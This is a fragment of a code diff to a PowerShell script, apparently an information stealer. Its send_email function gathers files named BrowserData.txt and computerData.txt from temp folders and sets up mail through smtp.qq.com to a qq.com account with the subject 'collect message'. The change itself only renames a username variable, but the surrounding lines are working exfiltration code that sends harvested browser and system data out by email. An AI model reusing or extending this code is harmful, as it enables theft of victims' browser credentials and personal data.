@@ -450,13 +450,13 @@ function send_email {
 $p = $env:TMP + '\--BrowserData.txt'
 $c = $env:TEMP + '\' + $FolderName + '\' + 'computerData.txt'
 
-$From = $username + "@qq.com"
-$To = $username + "@qq.com"
+$From = $un + "@qq.com"
+$To = $un + "@qq.com"
 $Subject = "collect message" 
 $Body = "collect message"
 $smtpServer = "smtp.qq.com"
 $smtpPort = 25
-$username = $username + "@qq.com"
+$username = $un + "@qq.com"
 
 $SMTPMessage = New-Object System.Net.Mail.MailMessage($From, $To, $Subject, $Body)
 
